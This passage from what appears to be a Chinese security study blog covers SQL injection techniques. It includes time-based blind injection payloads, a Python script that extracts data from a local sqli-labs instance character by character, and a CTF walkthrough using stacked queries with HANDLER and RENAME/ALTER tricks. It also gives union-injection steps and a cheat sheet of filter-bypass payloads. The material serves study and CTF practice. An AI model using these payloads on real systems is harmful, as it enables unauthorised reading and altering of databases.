<h5 id="6-比较字符串"><a href="#6-比较字符串" class="headerlink" title="6.比较字符串"></a>6.比较字符串</h5><p>当字符串比较时是按位比较的</p>
<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303178229.png" alt="1662303178229"></p>
<h5 id="7-like"><a href="#7-like" class="headerlink" title="7.like"></a>7.like</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们知道在 MySQL 中使用 SQL SELECT 命令来读取数据， 同时我 们可以在 SELECT 语句中使用 WHERE 子句来获取指定的记录。</span><br><span class="line">WHERE 子句中可以使用等号 = 来设定获取数据的条件，如 &quot;runoob_</span><br><span class="line">author = &#x27;RUNOOB.COM&#x27;&quot;。 但是有时候我们需要获取 runoob_author 字段含有 &quot;COM&quot; 字符的所 有记录，这时我们就需要在 WHERE 子句中使用 SQL LIKE 子句。</span><br><span class="line">SQL LIKE 子句中使用百分号 %字符来表示任意字符，类似于UNIX或 正则表达式中的星号 *。 如果没有使用百分号 %, LIKE 子句与等号 = 的效果是一样的。</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303301148.png" alt="1662303301148"></p>
<h5 id="8-正则表达式-regexp-rlike"><a href="#8-正则表达式-regexp-rlike" class="headerlink" title="8.正则表达式 regexp rlike"></a>8.正则表达式 regexp rlike</h5><p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303405311.png" alt="1662303405311"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp是不区分大小写的，需要大小写敏感 需要加上binary关键字</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303431365.png" alt="1662303431365"></p>
<h5 id="9-between"><a href="#9-between" class="headerlink" title="9.between"></a>9.between</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">expr [NOT] BETWEEN begin_expr AND end_expr;</span><br><span class="line">between筛选的是 expr &gt;= begin_expr并且 expr &lt;= end_expr 的数据，如果不存 在则返回的是0；</span><br><span class="line">not between筛选的是 expr &lt; begin_expr或者 expr &gt; end_expr 的数据，如果不 存在则返回的是0； 如果 expr 返回的是 NULL，则between 也返回的是null</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303596097.png" alt="1662303596097"></p>
<h5 id="10-in"><a href="#10-in" class="headerlink" title="10.in"></a>10.in</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依然是大小写不敏感的 字符数字都可用 也有not in</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303642507.png" alt="1662303642507"></p>
<h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><h4 id="1-延时盲注的介绍"><a href="#1-延时盲注的介绍" class="headerlink" title="1.延时盲注的介绍"></a>1.延时盲注的介绍</h4><p>在页面中，不管用户输入什么，数据交互完成以后目标网站没有错误和正确的页面回显，这 种情况我们可以利用时间函数来判断数据有没有在目标数据中得到执行。既无论用户输入什么页面都是下面这种</p>
<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/image-20221210230641480.png" alt="image-20221210230641480"></p>
<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/image-20221210230656871.png" alt="image-20221210230656871"></p>
<h4 id="2-延时盲注的攻击流程"><a href="#2-延时盲注的攻击流程" class="headerlink" title="2.延时盲注的攻击流程"></a>2.延时盲注的攻击流程</h4><h5 id="1-延时盲注的判断"><a href="#1-延时盲注的判断" class="headerlink" title="1.延时盲注的判断"></a>1.延时盲注的判断</h5><p>由于没有任何的回显内容，所以无法通过查看回显的方法判断是否存在注入，可以使用1 and sleep(5)或 者1’ and sleep(5)#进行测试，如果页面执行有延迟，说明存在漏洞，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">5</span>); #数字型</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> sleep(<span class="number">5</span>)#<span class="string">&#x27;;#字符型</span></span><br></pre></td></tr></table></figure>

<h5 id="2-获取数据库长度-1"><a href="#2-获取数据库长度-1" class="headerlink" title="2.获取数据库长度"></a>2.获取数据库长度</h5><p>可以使用if语句进行判断，语法格式：if(expr1, expr2, expr3)：判断语句 如果第一个语句正确就执行第 二个语句，否则执行第三个语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> if(length(database()<span class="operator">=</span><span class="number">8</span>),sleep(<span class="number">3</span>),<span class="number">1</span>)#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果有延时说明数据库长度就是8</p>
<h5 id="3-获取数据库名"><a href="#3-获取数据库名" class="headerlink" title="3.获取数据库名"></a>3.获取数据库名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(substr(database(),1,1)=&#x27;</span>s<span class="string">&#x27;,sleep(5),1)%23</span></span><br></pre></td></tr></table></figure>

<p>或者利用ascii函数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<h5 id="4-获取表名"><a href="#4-获取表名" class="headerlink" title="4.获取表名"></a>4.获取表名</h5><p>可以先获取表的数量</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if((select count(table_name) from information_schema.tables where table_schema=&quot;security&quot;)=4,sleep(5),1)%23</span></span><br></pre></td></tr></table></figure>

<p>然后获取每个表的长度</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6,sleep(5),1)%23</span></span><br></pre></td></tr></table></figure>

<p>再然后获取表的名称</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),1)%23</span></span><br></pre></td></tr></table></figure>

<h5 id="5-获取字段名"><a href="#5-获取字段名" class="headerlink" title="5.获取字段名"></a>5.获取字段名</h5><h5 id="6-获取字段内容"><a href="#6-获取字段内容" class="headerlink" title="6.获取字段内容"></a>6.获取字段内容</h5><h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1/sqli/Less-9/?id=1&#x27; and &quot;</span></span><br><span class="line"><span class="comment"># select = &#x27;select database()&#x27;   #数据库  security</span></span><br><span class="line"><span class="comment"># select = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;   #表名  emails,referers,uagents,users</span></span><br><span class="line"><span class="comment"># select = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;emails&#x27;&quot;            #字段名</span></span><br><span class="line">select = <span class="string">&quot;select group_concat(email_id) from emails&quot;</span>   <span class="comment">#字段内容</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        payload = <span class="string">f&quot;if((ascii(substr((<span class="subst">&#123;select&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>),sleep(3),1)--+&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="number">125</span>:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%9B%B2%E6%B3%A8/" rel="tag">盲注</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-堆叠注入"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"
    >堆叠注入</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2023-02-02T08:53:04.000Z" itemprop="datePublished">2023-02-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL可以执行多条语句，多条语句之前用;做分隔。 简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法 执行其他恶意语句，如RENAME、DROP等，堆叠注入可以用于执行任何SQL语句。 </span><br><span class="line">并不是所有情况下都可以使用堆叠注入</span><br><span class="line">需要满足条件$mysqli-&gt;multi_query($sql);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返 回前端页面。建议使用union联合注入，若无法使用联合注入， 可考虑使用RENAME关键 字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名</span><br></pre></td></tr></table></figure>

<h3 id="当select被过滤了用handler来绕过"><a href="#当select被过滤了用handler来绕过" class="headerlink" title="当select被过滤了用handler来绕过"></a>当select被过滤了用handler来绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一 行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是</span><br><span class="line">mysql专用的语句，并没有包含到SQL标准中。</span><br><span class="line">条件：堆叠注入</span><br><span class="line">handler users open as hd; #指定数据表进行载入并将返回句柄重命名</span><br><span class="line">handler hd read first; #读取指定表/句柄的首行数据 </span><br><span class="line">handler hd read next; #读取指定表/句柄的下一行数据</span><br><span class="line">handler hd close; #关闭句柄</span><br></pre></td></tr></table></figure>



<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[强网杯 2019]随便注</p>
<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190616986.png" alt="1662190616986"></p>
<p>输入  1’</p>
<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190675022.png" alt="1662190675022"></p>
<p>报错说明存在sql注入漏洞</p>
<p>输入   1’ order by 3#时</p>
<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190776274.png" alt="1662190776274"></p>
<p>说明select语句里有两个字段</p>
<p>然后尝试用联合注入获取数据库名</p>
<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190923197.png" alt="1662190923197"></p>
<p>发现select被过滤了然后用堆叠注入的方法获得表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables;#</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191211421.png" alt="1662191211421"></p>
<p>得到两个表 然后分别查询两个表中的字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `1919810931114514`;#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191442844.png" alt="1662191442844"></p>
<p>这里发现有个 flag</p>
<p>第一种方法：</p>
<p>所以只需   select flag from <code>1919810931114514</code>;#   但是select被过滤了所以要用handler1</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first#</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191646739.png" alt="1662191646739"></p>
<p>第二种方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from `words`;#</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662206518828.png" alt="1662206518828"></p>
<p>发现了   id    data   这两个字段</p>
<p>可以</p>
<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
<p>2，把 1919810931114514 表的名字改为 words 。</p>
<p>3 ，把flag改为id</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;RENAME TABLE `words` TO `words2`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#</span><br></pre></td></tr></table></figure>

<p>然后</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1#</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662208984049.png" alt="1662208984049"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" rel="tag">堆叠注入</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-union联合注入"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/02/union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"
    >union联合注入</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/02/union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2023-02-02T08:51:22.000Z" itemprop="datePublished">2023-02-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h3 id="1-判断是否存在漏洞"><a href="#1-判断是否存在漏洞" class="headerlink" title="1.判断是否存在漏洞"></a>1.判断是否存在漏洞</h3><p>用单引号或者双引号判断是否报错。若报错则存在sql注入漏洞</p>
<h3 id="2-判断是字符型的还是数字型漏洞"><a href="#2-判断是字符型的还是数字型漏洞" class="headerlink" title="2.判断是字符型的还是数字型漏洞"></a>2.判断是字符型的还是数字型漏洞</h3><p>输入    </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2#</span></span><br></pre></td></tr></table></figure>

<p>如果与原来只输入  1   的结果相同则是数字</p>
<h3 id="3-判断select几列"><a href="#3-判断select几列" class="headerlink" title="3.判断select几列"></a>3.判断select几列</h3><p>用  order  by</p>
<p>如果order by  被过滤了可以用group by</p>
<h3 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4.获取数据库名"></a>4.获取数据库名</h3><p>假设这里select的是3列  然后需要自己在判断一下哪几位是回显位  然后用联合注入查询 数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,database()#</span></span><br></pre></td></tr></table></figure>

<h3 id="5-获取数据库表名"><a href="#5-获取数据库表名" class="headerlink" title="5.获取数据库表名"></a>5.获取数据库表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。 其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表， 表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际 上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</span><br><span class="line">SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果 取之此表。</span><br><span class="line">TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个</span><br><span class="line">schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的 结果取之此表。</span><br><span class="line">COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是</span><br><span class="line">show columns from schemaname.tablename的结果取之此表。</span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure>

<h3 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;&#x27; and table_schema=database()#</span></span><br></pre></td></tr></table></figure>

<h3 id="7-查询字段中的内容"><a href="#7-查询字段中的内容" class="headerlink" title="7.查询字段中的内容"></a>7.查询字段中的内容</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select group_concat(, , ) from biaoming#</span></span><br></pre></td></tr></table></figure>



<p>group_concat()  函数是让多行数据在一行显示   如果被过滤  可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit 0,1;</span><br></pre></td></tr></table></figure>



 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/union%E8%81%94%E5%90%88/" rel="tag">union联合</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-绕过技巧"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/02/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"
    >绕过技巧</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/02/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" class="article-date">
  <time datetime="2023-02-02T08:49:27.000Z" itemprop="datePublished">2023-02-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="1-空格被过滤"><a href="#1-空格被过滤" class="headerlink" title="1.空格被过滤"></a>1.空格被过滤</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">括号绕过</span><br><span class="line"><span class="keyword">select</span>(id)<span class="keyword">from</span>(admin)<span class="keyword">where</span>(id<span class="operator">=</span><span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注释绕过</span><br><span class="line"><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>admin;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反引号绕过（数据库默认识别关键字，不用加引号）</span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>`admin`<span class="keyword">where</span>`id`<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">其它空白字符绕过</span><br><span class="line">TAB %09   TAB键</span><br><span class="line">LF  %0A   新行</span><br><span class="line">FF  %0C   新页</span><br><span class="line">CR  %0D   回车</span><br></pre></td></tr></table></figure>



<h1 id="2-逗号被过滤"><a href="#2-逗号被过滤" class="headerlink" title="2.逗号被过滤"></a>2.逗号被过滤</h1><p>可以用  from for 代替</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(<span class="string">&#x27;admin&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> substr(<span class="string">&#x27;admin&#x27;</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin limit <span class="number">1</span>,<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<h1 id="3-过滤-掉比较运算符"><a href="#3-过滤-掉比较运算符" class="headerlink" title="3.过滤 掉比较运算符"></a>3.过滤 掉比较运算符</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">greaest(ascii(substr(<span class="string">&#x27;admin&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>) <span class="operator">=</span> <span class="number">97</span></span><br><span class="line">least(<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line">strcmp(str1,str2)  </span><br><span class="line">substr(<span class="string">&#x27;admin&#x27;</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>) <span class="keyword">in</span> (<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">substr(<span class="string">&#x27;admin&#x27;</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>) <span class="keyword">between</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="4-过滤and"><a href="#4-过滤and" class="headerlink" title="4.过滤and"></a>4.过滤and</h1><p>用&amp;&amp;但是&amp;一般会被认为参数连接符   所以需要使用URL编码</p>
<p>%26%26</p>
<p>还可以用or来替代</p>
<h1 id="5-过滤等号"><a href="#5-过滤等号" class="headerlink" title="5.过滤等号"></a>5.过滤等号</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用  <span class="keyword">in</span> (<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">like</span>,rlike</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">between</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp</span><br></pre></td></tr></table></figure>



<h1 id="6-过滤注释符"><a href="#6-过滤注释符" class="headerlink" title="6.过滤注释符"></a>6.过滤注释符</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--空格</span><br><span class="line">--+</span><br><span class="line">/**/</span><br><span class="line"><span class="meta prompt_">#</span></span><br></pre></td></tr></table></figure>

<h1 id="7-内联注释绕过"><a href="#7-内联注释绕过" class="headerlink" title="7.内联注释绕过"></a>7.内联注释绕过</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="comment">/*!select*/</span>  <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<h1 id="8-过滤单引号"><a href="#8-过滤单引号" class="headerlink" title="8.过滤单引号"></a>8.过滤单引号</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">十六进制绕过</span><br><span class="line"><span class="type">char</span>()函数  web   <span class="comment">---&gt;&gt;   char(119)+char(101)+char(98)</span></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/" rel="tag">sql</a></li></ul>

    </footer>
